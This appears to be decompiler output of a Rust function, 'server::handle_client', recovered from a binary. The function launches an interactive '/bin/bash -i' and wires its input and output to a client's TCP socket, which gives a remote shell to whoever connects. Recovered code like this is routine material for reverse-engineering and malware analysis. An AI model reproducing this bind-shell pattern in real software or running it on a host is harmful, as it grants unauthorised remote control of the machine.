void _ZN6server13handle_client17h0b21350cc7b22776E(int param_1)

{
  undefined8 uVar1;
  undefined4 uVar2;
  undefined local_11c [28];
  undefined local_100 [32];
  undefined local_e0 [208];
  
                    /* try { // try from 0010dc4c to 0010dc61 has its CatchHandler @ 0010dd32 */
  _ZN3std7process7Command3new17h5eb91abcf33374d6E(local_e0,"/bin/bash",9);
                    /* try { // try from 0010dc62 to 0010dce2 has its CatchHandler @ 0010dd37 */
  uVar1 = _ZN3std7process7Command3arg17h92aa95d0ce24437cE(local_e0,"-i",2);
  uVar2 = (*(code *)
            PTR__ZN81__LT_std__sys__pal__unix__fd__FileDesc_u20_as_u20_std__os__fd__raw__FromRawFd_GT_11from_raw_fd17h284301365c5ddf25E_0016ef10
          )(param_1);
  uVar1 = _ZN3std7process7Command5stdin17he98e54bf20c0f4f0E(uVar1,3,uVar2);
  uVar2 = (*(code *)
            PTR__ZN81__LT_std__sys__pal__unix__fd__FileDesc_u20_as_u20_std__os__fd__raw__FromRawFd_GT_11from_raw_fd17h284301365c5ddf25E_0016ef10
          )(param_1);
  uVar1 = _ZN3std7process7Command6stdout17h3421f856f44c7056E(uVar1,3,uVar2);
  uVar2 = (*(code *)
            PTR__ZN81__LT_std__sys__pal__unix__fd__FileDesc_u20_as_u20_std__os__fd__raw__FromRawFd_GT_11from_raw_fd17h284301365c5ddf25E_0016ef10
          )(param_1);
  uVar1 = _ZN3std7process7Command6stderr17h778f9adf69fa6ef6E(uVar1,3,uVar2);
  (*(code *)PTR__ZN3std7process7Command5spawn17h5a66dce7a1b6416aE_0016ef38)(local_100,uVar1);
  _ZN4core6result19Result_LT_T_C_E_GT_6unwrap17h3a1e058414a6c9ecE(local_11c,local_100);
                    /* try { // try from 0010dce3 to 0010dcfc has its CatchHandler @ 0010dd23 */
  (*(code *)PTR__ZN3std7process5Child4wait17h9eaa6dd104164a58E_0016eda8)(local_100,local_11c);
  _ZN4core6result19Result_LT_T_C_E_GT_6unwrap17h355d22e1d7af9bcbE(local_100);
                    /* try { // try from 0010dcfd to 0010dd06 has its CatchHandler @ 0010dd37 */
  _ZN4core3ptr40drop_in_place_LT_std__process__Child_GT_17ha239f9afbc4a57d3E(local_11c);
                    /* try { // try from 0010dd07 to 0010dd10 has its CatchHandler @ 0010dd32 */
  _ZN4core3ptr42drop_in_place_LT_std__process__Command_GT_17h62424edbded0113aE(local_e0);
  _ZN4core3ptr45drop_in_place_LT_std__net__tcp__TcpStream_GT_17haee64bd767160edcE(param_1);
  return;
}